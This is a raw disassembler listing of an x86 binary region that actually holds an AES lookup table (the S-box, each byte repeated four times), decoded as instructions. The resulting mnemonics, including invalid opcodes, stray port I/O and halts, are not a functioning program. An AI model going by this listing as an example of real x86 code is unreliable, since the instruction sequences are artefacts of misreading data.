  40337e:	0a 0a                	or     (%edx),%cl
  403380:	92                   	xchg   %eax,%edx
  403381:	db 49 49             	fisttpl 0x49(%ecx)
  403384:	0c 0a                	or     $0xa,%al
  403386:	06                   	push   %es
  403387:	06                   	push   %es
  403388:	48                   	dec    %eax
  403389:	6c                   	insb   (%dx),%es:(%edi)
  40338a:	24 24                	and    $0x24,%al
  40338c:	b8 e4 5c 5c 9f       	mov    $0x9f5c5ce4,%eax
  403391:	5d                   	pop    %ebp
  403392:	c2 c2 bd             	ret    $0xbdc2
  403395:	6e                   	outsb  %ds:(%esi),(%dx)
  403396:	d3 d3                	rcl    %cl,%ebx
  403398:	43                   	inc    %ebx
  403399:	ef                   	out    %eax,(%dx)
  40339a:	ac                   	lods   %ds:(%esi),%al
  40339b:	ac                   	lods   %ds:(%esi),%al
  40339c:	c4 a6 62 62 39 a8    	les    -0x57c69d9e(%esi),%esp
  4033a2:	91                   	xchg   %eax,%ecx
  4033a3:	91                   	xchg   %eax,%ecx
  4033a4:	31 a4 95 95 d3 37 e4 	xor    %esp,-0x1bc82c6b(%ebp,%edx,4)
  4033ab:	e4 f2                	in     $0xf2,%al
  4033ad:	8b 79 79             	mov    0x79(%ecx),%edi
  4033b0:	d5 32                	aad    $0x32
  4033b2:	e7 e7                	out    %eax,$0xe7
  4033b4:	8b 43 c8             	mov    -0x38(%ebx),%eax
  4033b7:	c8 6e 59 37          	enter  $0x596e,$0x37
  4033bb:	37                   	aaa
  4033bc:	da b7 6d 6d 01 8c    	fidivl -0x73fe9293(%edi)
  4033c2:	8d 8d b1 64 d5 d5    	lea    -0x2a2a9b4f(%ebp),%ecx
  4033c8:	9c                   	pushf
  4033c9:	d2 4e 4e             	rorb   %cl,0x4e(%esi)
  4033cc:	49                   	dec    %ecx
  4033cd:	e0 a9                	loopne 0x403378
  4033cf:	a9 d8 b4 6c 6c       	test   $0x6c6cb4d8,%eax
  4033d4:	ac                   	lods   %ds:(%esi),%al
  4033d5:	fa                   	cli
  4033d6:	56                   	push   %esi
  4033d7:	56                   	push   %esi
  4033d8:	f3 07                	repz pop %es
  4033da:	f4                   	hlt
  4033db:	f4                   	hlt
  4033dc:	cf                   	iret
  4033dd:	25 ea ea ca af       	and    $0xafcaeaea,%eax
  4033e2:	65 65 f4             	gs gs hlt
  4033e5:	8e 7a 7a             	mov    0x7a(%edx),%?
  4033e8:	47                   	inc    %edi
  4033e9:	e9 ae ae 10 18       	jmp    0x1850e29c
  4033ee:	08 08                	or     %cl,(%eax)
  4033f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4033f1:	d5 ba                	aad    $0xba
  4033f3:	ba f0 88 78 78       	mov    $0x787888f0,%edx
  4033f8:	4a                   	dec    %edx
  4033f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4033fa:	25 25 5c 72 2e       	and    $0x2e725c25,%eax
  4033ff:	2e 38 24 1c          	cmp    %ah,%cs:(%esp,%ebx,1)
  403403:	1c 57                	sbb    $0x57,%al
  403405:	f1                   	int1
  403406:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403407:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403408:	73 c7                	jae    0x4033d1
  40340a:	b4 b4                	mov    $0xb4,%ah
  40340c:	97                   	xchg   %eax,%edi
  40340d:	51                   	push   %ecx
  40340e:	c6 c6 cb             	mov    $0xcb,%dh
  403411:	23 e8                	and    %eax,%ebp
  403413:	e8 a1 7c dd dd       	call   0xde1db0b9
  403418:	e8 9c 74 74 3e       	call   0x3eb4a8b9
  40341d:	21 1f                	and    %ebx,(%edi)
  40341f:	1f                   	pop    %ds
  403420:	96                   	xchg   %eax,%esi
  403421:	dd 4b 4b             	fisttpll 0x4b(%ebx)
  403424:	61                   	popa
  403425:	dc bd bd 0d 86 8b    	fdivrl -0x7479f243(%ebp)
  40342b:	8b 0f                	mov    (%edi),%ecx
  40342d:	85 8a 8a e0 90 70    	test   %ecx,0x7090e08a(%edx)
  403433:	70 7c                	jo     0x4034b1
  403435:	42                   	inc    %edx
  403436:	3e 3e 71 c4          	ds jno,pt 0x4033fe
  40343a:	b5 b5                	mov    $0xb5,%ch
  40343c:	cc                   	int3
  40343d:	aa                   	stos   %al,%es:(%edi)
  40343e:	66 66 90             	data16 xchg %ax,%ax
  403441:	d8 48 48             	fmuls  0x48(%eax)
  403444:	06                   	push   %es
  403445:	05 03 03 f7 01       	add    $0x1f70303,%eax
  40344a:	f6 f6                	div    %dh
  40344c:	1c 12                	sbb    $0x12,%al
  40344e:	0e                   	push   %cs
  40344f:	0e                   	push   %cs
  403450:	c2 a3 61             	ret    $0x61a3
  403453:	61                   	popa
  403454:	6a 5f                	push   $0x5f
  403456:	35 35 ae f9 57       	xor    $0x57f9ae35,%eax
  40345b:	57                   	push   %edi
  40345c:	69 d0 b9 b9 17 91    	imul   $0x9117b9b9,%eax,%edx
  403462:	86 86 99 58 c1 c1    	xchg   %al,-0x3e3ea767(%esi)
  403468:	3a 27                	cmp    (%edi),%ah
  40346a:	1d 1d 27 b9 9e       	sbb    $0x9eb9271d,%eax
  40346f:	9e                   	sahf
  403470:	d9 38                	fnstcw (%eax)
  403472:	e1 e1                	loope  0x403455
  403474:	eb 13                	jmp    0x403489
  403476:	f8                   	clc
  403477:	f8                   	clc
  403478:	2b b3 98 98 22 33    	sub    0x33229898(%ebx),%esi
  40347e:	11 11                	adc    %edx,(%ecx)
  403480:	d2 bb 69 69 a9 70    	sarb   %cl,0x70a96969(%ebx)
  403486:	d9 d9                	(bad)
  403488:	07                   	pop    %es
  403489:	89 8e 8e 33 a7 94    	mov    %ecx,-0x6b58cc72(%esi)
  40348f:	94                   	xchg   %eax,%esp
  403490:	2d b6 9b 9b 3c       	sub    $0x3c9b9bb6,%eax
  403495:	22 1e                	and    (%esi),%bl
  403497:	1e                   	push   %ds
  403498:	15 92 87 87 c9       	adc    $0xc9878792,%eax
  40349d:	20 e9                	and    %ch,%cl
  40349f:	e9 87 49 ce ce       	jmp    0xcf0e7e2b
  4034a4:	aa                   	stos   %al,%es:(%edi)
  4034a5:	ff 55 55             	call   *0x55(%ebp)
  4034a8:	50                   	push   %eax
  4034a9:	78 28                	js     0x4034d3
  4034ab:	28 a5 7a df df 03    	sub    %ah,0x3dfdf7a(%ebp)
  4034b1:	8f                   	(bad)
  4034b2:	8c 8c 59 f8 a1 a1 09 	mov    %cs,0x9a1a1f8(%ecx,%ebx,2)
  4034b9:	80 89 89 1a 17 0d 0d 	orb    $0xd,0xd171a89(%ecx)
  4034c0:	65 da bf bf d7 31 e6 	fidivrl %gs:-0x19ce2841(%edi)
  4034c7:	e6 84                	out    %al,$0x84
  4034c9:	c6 42 42 d0          	movb   $0xd0,0x42(%edx)
  4034cd:	b8 68 68 82 c3       	mov    $0xc3826868,%eax
  4034d2:	41                   	inc    %ecx
  4034d3:	41                   	inc    %ecx
  4034d4:	29 b0 99 99 5a 77    	sub    %esi,0x775a9999(%eax)
  4034da:	2d 2d 1e 11 0f       	sub    $0xf111e2d,%eax
  4034df:	0f 7b                	(bad)
  4034e1:	cb                   	lret
  4034e2:	b0 b0                	mov    $0xb0,%al
  4034e4:	a8 fc                	test   $0xfc,%al
  4034e6:	54                   	push   %esp
  4034e7:	54                   	push   %esp
  4034e8:	6d                   	insl   (%dx),%es:(%edi)
  4034e9:	d6                   	salc
  4034ea:	bb bb 2c 3a 16       	mov    $0x163a2cbb,%ebx
  4034ef:	16                   	push   %ss
  4034f0:	63 63 63             	arpl   %esp,0x63(%ebx)
  4034f3:	63 7c 7c 7c          	arpl   %edi,0x7c(%esp,%edi,2)
  4034f7:	7c 77                	jl     0x403570
  4034f9:	77 77                	ja     0x403572
  4034fb:	77 7b                	ja     0x403578
  4034fd:	7b 7b                	jnp    0x40357a
  4034ff:	7b f2                	jnp    0x4034f3
  403501:	f2 f2 f2 6b 6b 6b 6b 	repnz repnz repnz imul $0x6b,0x6b(%ebx),%ebp
  403508:	6f                   	outsl  %ds:(%esi),(%dx)
  403509:	6f                   	outsl  %ds:(%esi),(%dx)
  40350a:	6f                   	outsl  %ds:(%esi),(%dx)
  40350b:	6f                   	outsl  %ds:(%esi),(%dx)
  40350c:	c5 c5 c5             	(bad)
  40350f:	c5 30                	lds    (%eax),%esi
  403511:	30 30                	xor    %dh,(%eax)
  403513:	30 01                	xor    %al,(%ecx)
  403515:	01 01                	add    %eax,(%ecx)
  403517:	01 67 67             	add    %esp,0x67(%edi)
  40351a:	67 67 2b 2b          	addr16 sub (%bp,%di),%ebp
  40351e:	2b 2b                	sub    (%ebx),%ebp
  403520:	fe                   	(bad)
  403521:	fe                   	(bad)
  403522:	fe                   	(bad)
  403523:	fe                   	(bad)
  403524:	d7                   	xlat   %ds:(%ebx)
  403525:	d7                   	xlat   %ds:(%ebx)
  403526:	d7                   	xlat   %ds:(%ebx)
  403527:	d7                   	xlat   %ds:(%ebx)
  403528:	ab                   	stos   %eax,%es:(%edi)
  403529:	ab                   	stos   %eax,%es:(%edi)
  40352a:	ab                   	stos   %eax,%es:(%edi)
  40352b:	ab                   	stos   %eax,%es:(%edi)
  40352c:	76 76                	jbe    0x4035a4
  40352e:	76 76                	jbe    0x4035a6
  403530:	ca ca ca             	lret   $0xcaca
  403533:	ca 82 82             	lret   $0x8282
  403536:	82 82 c9 c9 c9 c9 7d 	addb   $0x7d,-0x36363637(%edx)
  40353d:	7d 7d                	jge    0x4035bc
  40353f:	7d fa                	jge    0x40353b
  403541:	fa                   	cli
  403542:	fa                   	cli
  403543:	fa                   	cli
  403544:	59                   	pop    %ecx
  403545:	59                   	pop    %ecx
  403546:	59                   	pop    %ecx
  403547:	59                   	pop    %ecx
  403548:	47                   	inc    %edi
  403549:	47                   	inc    %edi
  40354a:	47                   	inc    %edi
  40354b:	47                   	inc    %edi
  40354c:	f0 f0 f0 f0 ad       	lock lock lock lock lods %ds:(%esi),%eax
  403551:	ad                   	lods   %ds:(%esi),%eax
  403552:	ad                   	lods   %ds:(%esi),%eax
  403553:	ad                   	lods   %ds:(%esi),%eax
  403554:	d4 d4                	aam    $0xd4
  403556:	d4 d4                	aam    $0xd4
  403558:	a2 a2 a2 a2 af       	mov    %al,0xafa2a2a2
  40355d:	af                   	scas   %es:(%edi),%eax
  40355e:	af                   	scas   %es:(%edi),%eax
  40355f:	af                   	scas   %es:(%edi),%eax
  403560:	9c                   	pushf
  403561:	9c                   	pushf
  403562:	9c                   	pushf
  403563:	9c                   	pushf
  403564:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403565:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403566:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403567:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403568:	72 72                	jb     0x4035dc
  40356a:	72 72                	jb     0x4035de
  40356c:	c0 c0 c0             	rol    $0xc0,%al
  40356f:	c0 b7 b7 b7 b7 fd fd 	shlb   $0xfd,-0x2484849(%edi)
  403576:	fd                   	std
  403577:	fd                   	std
  403578:	93                   	xchg   %eax,%ebx
  403579:	93                   	xchg   %eax,%ebx
  40357a:	93                   	xchg   %eax,%ebx
  40357b:	93                   	xchg   %eax,%ebx
  40357c:	26 26 26 26 36 36 36 	es es es es ss ss ss ss aas
  403583:	36 3f 
  403585:	3f                   	aas
  403586:	3f                   	aas
  403587:	3f                   	aas
  403588:	f7 f7                	div    %edi
  40358a:	f7 f7                	div    %edi
  40358c:	cc                   	int3
  40358d:	cc                   	int3
  40358e:	cc                   	int3
  40358f:	cc                   	int3
  403590:	34 34                	xor    $0x34,%al
  403592:	34 34                	xor    $0x34,%al
  403594:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403595:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403596:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403597:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403598:	e5 e5                	in     $0xe5,%eax
  40359a:	e5 e5                	in     $0xe5,%eax
  40359c:	f1                   	int1
  40359d:	f1                   	int1
  40359e:	f1                   	int1
  40359f:	f1                   	int1
  4035a0:	71 71                	jno    0x403613
  4035a2:	71 71                	jno    0x403615
  4035a4:	d8 d8                	fcomp  %st(0)
  4035a6:	d8 d8                	fcomp  %st(0)
  4035a8:	31 31                	xor    %esi,(%ecx)
  4035aa:	31 31                	xor    %esi,(%ecx)
  4035ac:	15 15 15 15 04       	adc    $0x4151515,%eax
  4035b1:	04 04                	add    $0x4,%al
  4035b3:	04 c7                	add    $0xc7,%al
  4035b5:	c7 c7 c7 23 23 23    	mov    $0x232323c7,%edi
  4035bb:	23 c3                	and    %ebx,%eax
  4035bd:	c3                   	ret
  4035be:	c3                   	ret
  4035bf:	c3                   	ret
  4035c0:	18 18                	sbb    %bl,(%eax)
  4035c2:	18 18                	sbb    %bl,(%eax)
  4035c4:	96                   	xchg   %eax,%esi
  4035c5:	96                   	xchg   %eax,%esi
  4035c6:	96                   	xchg   %eax,%esi
  4035c7:	96                   	xchg   %eax,%esi
  4035c8:	05 05 05 05 9a       	add    $0x9a050505,%eax
  4035cd:	9a 9a 9a 07 07 07 07 	lcall  $0x707,$0x7079a9a
  4035d4:	12 12                	adc    (%edx),%dl
  4035d6:	12 12                	adc    (%edx),%dl
  4035d8:	80 80 80 80 e2 e2 e2 	addb   $0xe2,-0x1d1d7f80(%eax)
  4035df:	e2 eb                	loop   0x4035cc
  4035e1:	eb eb                	jmp    0x4035ce
  4035e3:	eb 27                	jmp    0x40360c
  4035e5:	27                   	daa
  4035e6:	27                   	daa
  4035e7:	27                   	daa
  4035e8:	b2 b2                	mov    $0xb2,%dl
  4035ea:	b2 b2                	mov    $0xb2,%dl
  4035ec:	75 75                	jne    0x403663
  4035ee:	75 75                	jne    0x403665
  4035f0:	09 09                	or     %ecx,(%ecx)
  4035f2:	09 09                	or     %ecx,(%ecx)
  4035f4:	83 83 83 83 2c 2c 2c 	addl   $0x2c,0x2c2c8383(%ebx)
  4035fb:	2c 1a                	sub    $0x1a,%al
  4035fd:	1a 1a                	sbb    (%edx),%bl
  4035ff:	1a 1b                	sbb    (%ebx),%bl
  403601:	1b 1b                	sbb    (%ebx),%ebx
  403603:	1b 6e 6e             	sbb    0x6e(%esi),%ebp
  403606:	6e                   	outsb  %ds:(%esi),(%dx)
  403607:	6e                   	outsb  %ds:(%esi),(%dx)
  403608:	5a                   	pop    %edx
  403609:	5a                   	pop    %edx
  40360a:	5a                   	pop    %edx
  40360b:	5a                   	pop    %edx
  40360c:	a0 a0 a0 a0 52       	mov    0x52a0a0a0,%al
  403611:	52                   	push   %edx
  403612:	52                   	push   %edx
  403613:	52                   	push   %edx
  403614:	3b 3b                	cmp    (%ebx),%edi
  403616:	3b 3b                	cmp    (%ebx),%edi
  403618:	d6                   	salc
  403619:	d6                   	salc
  40361a:	d6                   	salc
  40361b:	d6                   	salc
  40361c:	b3 b3                	mov    $0xb3,%bl
  40361e:	b3 b3                	mov    $0xb3,%bl
  403620:	29 29                	sub    %ebp,(%ecx)
  403622:	29 29                	sub    %ebp,(%ecx)
  403624:	e3 e3                	jecxz  0x403609
  403626:	e3 e3                	jecxz  0x40360b
  403628:	2f                   	das
  403629:	2f                   	das
  40362a:	2f                   	das
  40362b:	2f                   	das
  40362c:	84 84 84 84 53 53 53 	test   %al,0x53535384(%esp,%eax,4)
  403633:	53                   	push   %ebx
  403634:	d1 d1                	rcl    $1,%ecx
  403636:	d1 d1                	rcl    $1,%ecx
  403638:	00 00                	add    %al,(%eax)
  40363a:	00 00                	add    %al,(%eax)
  40363c:	ed                   	in     (%dx),%eax
  40363d:	ed                   	in     (%dx),%eax
  40363e:	ed                   	in     (%dx),%eax
  40363f:	ed                   	in     (%dx),%eax
  403640:	20 20                	and    %ah,(%eax)
  403642:	20 20                	and    %ah,(%eax)
  403644:	fc                   	cld
  403645:	fc                   	cld
  403646:	fc                   	cld
  403647:	fc                   	cld
  403648:	b1 b1                	mov    $0xb1,%cl
  40364a:	b1 b1                	mov    $0xb1,%cl
  40364c:	5b                   	pop    %ebx
  40364d:	5b                   	pop    %ebx
  40364e:	5b                   	pop    %ebx
  40364f:	5b                   	pop    %ebx
  403650:	6a 6a                	push   $0x6a
  403652:	6a 6a                	push   $0x6a
  403654:	cb                   	lret
  403655:	cb                   	lret
  403656:	cb                   	lret
  403657:	cb                   	lret
  403658:	be be be be 39       	mov    $0x39bebebe,%esi
  40365d:	39 39                	cmp    %edi,(%ecx)
  40365f:	39 4a 4a             	cmp    %ecx,0x4a(%edx)
  403662:	4a                   	dec    %edx
  403663:	4a                   	dec    %edx
  403664:	4c                   	dec    %esp
  403665:	4c                   	dec    %esp
  403666:	4c                   	dec    %esp
  403667:	4c                   	dec    %esp
  403668:	58                   	pop    %eax
  403669:	58                   	pop    %eax
  40366a:	58                   	pop    %eax
  40366b:	58                   	pop    %eax
  40366c:	cf                   	iret
  40366d:	cf                   	iret
  40366e:	cf                   	iret
  40366f:	cf                   	iret
  403670:	d0 d0                	rcl    $1,%al
  403672:	d0 d0                	rcl    $1,%al
  403674:	ef                   	out    %eax,(%dx)
  403675:	ef                   	out    %eax,(%dx)
  403676:	ef                   	out    %eax,(%dx)
  403677:	ef                   	out    %eax,(%dx)
  403678:	aa                   	stos   %al,%es:(%edi)
  403679:	aa                   	stos   %al,%es:(%edi)
  40367a:	aa                   	stos   %al,%es:(%edi)
  40367b:	aa                   	stos   %al,%es:(%edi)
  40367c:	fb                   	sti
  40367d:	fb                   	sti
  40367e:	fb                   	sti
  40367f:	fb                   	sti
  403680:	43                   	inc    %ebx
  403681:	43                   	inc    %ebx
  403682:	43                   	inc    %ebx
  403683:	43                   	inc    %ebx
  403684:	4d                   	dec    %ebp
  403685:	4d                   	dec    %ebp
  403686:	4d                   	dec    %ebp
  403687:	4d                   	dec    %ebp
  403688:	33 33                	xor    (%ebx),%esi
  40368a:	33 33                	xor    (%ebx),%esi
  40368c:	85 85 85 85 45 45    	test   %eax,0x45458585(%ebp)
  403692:	45                   	inc    %ebp
  403693:	45                   	inc    %ebp
  403694:	f9                   	stc
  403695:	f9                   	stc
  403696:	f9                   	stc
  403697:	f9                   	stc
  403698:	02 02                	add    (%edx),%al
  40369a:	02 02                	add    (%edx),%al
  40369c:	7f 7f                	jg     0x40371d
  40369e:	7f 7f                	jg     0x40371f
  4036a0:	50                   	push   %eax
  4036a1:	50                   	push   %eax
  4036a2:	50                   	push   %eax
  4036a3:	50                   	push   %eax
  4036a4:	3c 3c                	cmp    $0x3c,%al
  4036a6:	3c 3c                	cmp    $0x3c,%al
  4036a8:	9f                   	lahf
  4036a9:	9f                   	lahf
  4036aa:	9f                   	lahf
  4036ab:	9f                   	lahf
  4036ac:	a8 a8                	test   $0xa8,%al
  4036ae:	a8 a8                	test   $0xa8,%al
  4036b0:	51                   	push   %ecx
  4036b1:	51                   	push   %ecx
  4036b2:	51                   	push   %ecx
  4036b3:	51                   	push   %ecx
  4036b4:	a3 a3 a3 a3 40       	mov    %eax,0x40a3a3a3
  4036b9:	40                   	inc    %eax
  4036ba:	40                   	inc    %eax
  4036bb:	40                   	inc    %eax
  4036bc:	8f                   	(bad)
  4036bd:	8f                   	(bad)
  4036be:	8f                   	(bad)
  4036bf:	8f                   	(bad)
  4036c0:	92                   	xchg   %eax,%edx
  4036c1:	92                   	xchg   %eax,%edx
  4036c2:	92                   	xchg   %eax,%edx
  4036c3:	92                   	xchg   %eax,%edx
  4036c4:	9d                   	popf
  4036c5:	9d                   	popf
  4036c6:	9d                   	popf
  4036c7:	9d                   	popf
  4036c8:	38 38                	cmp    %bh,(%eax)
  4036ca:	38 38                	cmp    %bh,(%eax)
  4036cc:	f5                   	cmc
  4036cd:	f5                   	cmc
  4036ce:	f5                   	cmc
  4036cf:	f5                   	cmc
  4036d0:	bc bc bc bc b6       	mov    $0xb6bcbcbc,%esp
  4036d5:	b6 b6                	mov    $0xb6,%dh
  4036d7:	b6 da                	mov    $0xda,%dh
  4036d9:	da da                	fcmovu %st(2),%st
  4036db:	da 21                	fisubl (%ecx)
  4036dd:	21 21                	and    %esp,(%ecx)
  4036df:	21 10                	and    %edx,(%eax)
  4036e1:	10 10                	adc    %dl,(%eax)
  4036e3:	10 ff                	adc    %bh,%bh
  4036e5:	ff                   	(bad)
  4036e6:	ff                   	(bad)
  4036e7:	ff f3                	push   %ebx
  4036e9:	f3 f3 f3 d2 d2       	repz repz repz rcl %cl,%dl
  4036ee:	d2 d2                	rcl    %cl,%dl
  4036f0:	cd cd                	int    $0xcd
  4036f2:	cd cd                	int    $0xcd
  4036f4:	0c 0c                	or     $0xc,%al
  4036f6:	0c 0c                	or     $0xc,%al
  4036f8:	13 13                	adc    (%ebx),%edx
  4036fa:	13 13                	adc    (%ebx),%edx
  4036fc:	ec                   	in     (%dx),%al
  4036fd:	ec                   	in     (%dx),%al
  4036fe:	ec                   	in     (%dx),%al
  4036ff:	ec                   	in     (%dx),%al
  403700:	5f                   	pop    %edi
  403701:	5f                   	pop    %edi
  403702:	5f                   	pop    %edi
  403703:	5f                   	pop    %edi
  403704:	97                   	xchg   %eax,%edi
  403705:	97                   	xchg   %eax,%edi
  403706:	97                   	xchg   %eax,%edi
  403707:	97                   	xchg   %eax,%edi
  403708:	44                   	inc    %esp
  403709:	44                   	inc    %esp
  40370a:	44                   	inc    %esp
  40370b:	44                   	inc    %esp
  40370c:	17                   	pop    %ss
  40370d:	17                   	pop    %ss
  40370e:	17                   	pop    %ss
  40370f:	17                   	pop    %ss
  403710:	c4                   	(bad)
  403711:	c4                   	(bad)
  403712:	c4                   	(bad)
  403713:	c4 a7 a7 a7 a7 7e    	les    0x7ea7a7a7(%edi),%esp
  403719:	7e 7e                	jle    0x403799
  40371b:	7e 3d                	jle    0x40375a
  40371d:	3d 3d 3d 64 64       	cmp    $0x64643d3d,%eax
  403722:	64 64 5d             	fs fs pop %ebp
  403725:	5d                   	pop    %ebp
  403726:	5d                   	pop    %ebp
  403727:	5d                   	pop    %ebp
  403728:	19 19                	sbb    %ebx,(%ecx)
  40372a:	19 19                	sbb    %ebx,(%ecx)
  40372c:	73 73                	jae    0x4037a1
  40372e:	73 73                	jae    0x4037a3
  403730:	60                   	pusha
  403731:	60                   	pusha
  403732:	60                   	pusha
  403733:	60                   	pusha
  403734:	81 81 81 81 4f 4f 4f 	addl   $0xdcdc4f4f,0x4f4f8181(%ecx)
  40373b:	4f dc dc 
  40373e:	dc dc                	(bad)
  403740:	22 22                	and    (%edx),%ah
  403742:	22 22                	and    (%edx),%ah
  403744:	2a 2a                	sub    (%edx),%ch
  403746:	2a 2a                	sub    (%edx),%ch
  403748:	90                   	nop
  403749:	90                   	nop
  40374a:	90                   	nop
  40374b:	90                   	nop
  40374c:	88 88 88 88 46 46    	mov    %cl,0x46468888(%eax)
  403752:	46                   	inc    %esi
  403753:	46                   	inc    %esi
  403754:	ee                   	out    %al,(%dx)
  403755:	ee                   	out    %al,(%dx)
  403756:	ee                   	out    %al,(%dx)
  403757:	ee                   	out    %al,(%dx)
  403758:	b8 b8 b8 b8 14       	mov    $0x14b8b8b8,%eax
  40375d:	14 14                	adc    $0x14,%al
  40375f:	14 de                	adc    $0xde,%al
  403761:	de de                	(bad)
  403763:	de 5e 5e             	ficomps 0x5e(%esi)
  403766:	5e                   	pop    %esi
  403767:	5e                   	pop    %esi
  403768:	0b 0b                	or     (%ebx),%ecx
  40376a:	0b 0b                	or     (%ebx),%ecx
  40376c:	db db                	fcmovnu %st(3),%st
  40376e:	db db                	fcmovnu %st(3),%st
  403770:	e0 e0                	loopne 0x403752
  403772:	e0 e0                	loopne 0x403754
  403774:	32 32                	xor    (%edx),%dh
  403776:	32 32                	xor    (%edx),%dh
  403778:	3a 3a                	cmp    (%edx),%bh
  40377a:	3a 3a                	cmp    (%edx),%bh
  40377c:	0a 0a                	or     (%edx),%cl
  40377e:	0a 0a                	or     (%edx),%cl
  403780:	49                   	dec    %ecx
  403781:	49                   	dec    %ecx
  403782:	49                   	dec    %ecx
  403783:	49                   	dec    %ecx
  403784:	06                   	push   %es
  403785:	06                   	push   %es
  403786:	06                   	push   %es
  403787:	06                   	push   %es
  403788:	24 24                	and    $0x24,%al
  40378a:	24 24                	and    $0x24,%al
  40378c:	5c                   	pop    %esp
  40378d:	5c                   	pop    %esp
  40378e:	5c                   	pop    %esp
  40378f:	5c                   	pop    %esp
  403790:	c2 c2 c2             	ret    $0xc2c2
  403793:	c2 d3 d3             	ret    $0xd3d3
  403796:	d3 d3                	rcl    %cl,%ebx
  403798:	ac                   	lods   %ds:(%esi),%al
  403799:	ac                   	lods   %ds:(%esi),%al
  40379a:	ac                   	lods   %ds:(%esi),%al
  40379b:	ac                   	lods   %ds:(%esi),%al
  40379c:	62 62 62             	bound  %esp,0x62(%edx)
  40379f:	62 91 91 91 91 95    	bound  %edx,-0x6a6e6e6f(%ecx)
  4037a5:	95                   	xchg   %eax,%ebp
  4037a6:	95                   	xchg   %eax,%ebp
  4037a7:	95                   	xchg   %eax,%ebp
  4037a8:	e4 e4                	in     $0xe4,%al
  4037aa:	e4 e4                	in     $0xe4,%al
  4037ac:	79 79                	jns    0x403827
  4037ae:	79 79                	jns    0x403829
  4037b0:	e7 e7                	out    %eax,$0xe7
  4037b2:	e7 e7                	out    %eax,$0xe7
  4037b4:	c8 c8 c8 c8          	enter  $0xc8c8,$0xc8
  4037b8:	37                   	aaa
  4037b9:	37                   	aaa
  4037ba:	37                   	aaa
  4037bb:	37                   	aaa
  4037bc:	6d                   	insl   (%dx),%es:(%edi)
  4037bd:	6d                   	insl   (%dx),%es:(%edi)
  4037be:	6d                   	insl   (%dx),%es:(%edi)
  4037bf:	6d                   	insl   (%dx),%es:(%edi)
  4037c0:	8d 8d 8d 8d d5 d5    	lea    -0x2a2a7273(%ebp),%ecx
  4037c6:	d5 d5                	aad    $0xd5
  4037c8:	4e                   	dec    %esi
  4037c9:	4e                   	dec    %esi
  4037ca:	4e                   	dec    %esi
  4037cb:	4e                   	dec    %esi
  4037cc:	a9 a9 a9 a9 6c       	test   $0x6ca9a9a9,%eax
  4037d1:	6c                   	insb   (%dx),%es:(%edi)
  4037d2:	6c                   	insb   (%dx),%es:(%edi)
  4037d3:	6c                   	insb   (%dx),%es:(%edi)
  4037d4:	56                   	push   %esi
  4037d5:	56                   	push   %esi
  4037d6:	56                   	push   %esi
  4037d7:	56                   	push   %esi
  4037d8:	f4                   	hlt
  4037d9:	f4                   	hlt
  4037da:	f4                   	hlt
  4037db:	f4                   	hlt
  4037dc:	ea ea ea ea 65 65 65 	ljmp   $0x6565,$0x65eaeaea
  4037e3:	65 7a 7a             	gs jp  0x403860
  4037e6:	7a 7a                	jp     0x403862
  4037e8:	ae                   	scas   %es:(%edi),%al
  4037e9:	ae                   	scas   %es:(%edi),%al
  4037ea:	ae                   	scas   %es:(%edi),%al
  4037eb:	ae                   	scas   %es:(%edi),%al
  4037ec:	08 08                	or     %cl,(%eax)
  4037ee:	08 08                	or     %cl,(%eax)
  4037f0:	ba ba ba ba 78       	mov    $0x78bababa,%edx
  4037f5:	78 78                	js     0x40386f
  4037f7:	78 25                	js     0x40381e
  4037f9:	25 25 25 2e 2e       	and    $0x2e2e2525,%eax
  4037fe:	2e 2e 1c 1c          	cs cs sbb $0x1c,%al
  403802:	1c 1c                	sbb    $0x1c,%al
  403804:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403805:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403806:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403807:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403808:	b4 b4                	mov    $0xb4,%ah
  40380a:	b4 b4                	mov    $0xb4,%ah
  40380c:	c6 c6 c6             	mov    $0xc6,%dh
  40380f:	c6                   	(bad)
  403810:	e8 e8 e8 e8 dd       	call   0xde2920fd
  403815:	dd dd                	fstp   %st(5)
  403817:	dd 74 74 74          	fnsave 0x74(%esp,%esi,2)
  40381b:	74 1f                	je     0x40383c
  40381d:	1f                   	pop    %ds
  40381e:	1f                   	pop    %ds
  40381f:	1f                   	pop    %ds
  403820:	4b                   	dec    %ebx
  403821:	4b                   	dec    %ebx
  403822:	4b                   	dec    %ebx
  403823:	4b                   	dec    %ebx
  403824:	bd bd bd bd 8b       	mov    $0x8bbdbdbd,%ebp
  403829:	8b 8b 8b 8a 8a 8a    	mov    -0x75757575(%ebx),%ecx
  40382f:	8a 70 70             	mov    0x70(%eax),%dh
  403832:	70 70                	jo     0x4038a4
  403834:	3e 3e 3e 3e b5 b5    	ds ds ds ds mov $0xb5,%ch
  40383a:	b5 b5                	mov    $0xb5,%ch
  40383c:	66 66 66 66 48       	data16 data16 data16 dec %ax
  403841:	48                   	dec    %eax
  403842:	48                   	dec    %eax
  403843:	48                   	dec    %eax
  403844:	03 03                	add    (%ebx),%eax
  403846:	03 03                	add    (%ebx),%eax
  403848:	f6 f6                	div    %dh
  40384a:	f6 f6                	div    %dh
  40384c:	0e                   	push   %cs
  40384d:	0e                   	push   %cs
  40384e:	0e                   	push   %cs
  40384f:	0e                   	push   %cs
  403850:	61                   	popa
  403851:	61                   	popa
  403852:	61                   	popa
  403853:	61                   	popa
  403854:	35 35 35 35 57       	xor    $0x57353535,%eax
  403859:	57                   	push   %edi
  40385a:	57                   	push   %edi
  40385b:	57                   	push   %edi
  40385c:	b9 b9 b9 b9 86       	mov    $0x86b9b9b9,%ecx
  403861:	86 86 86 c1 c1 c1    	xchg   %al,-0x3e3e3e7a(%esi)
  403867:	c1 1d 1d 1d 1d 9e 9e 	rcrl   $0x9e,0x9e1d1d1d
  40386e:	9e                   	sahf
  40386f:	9e                   	sahf
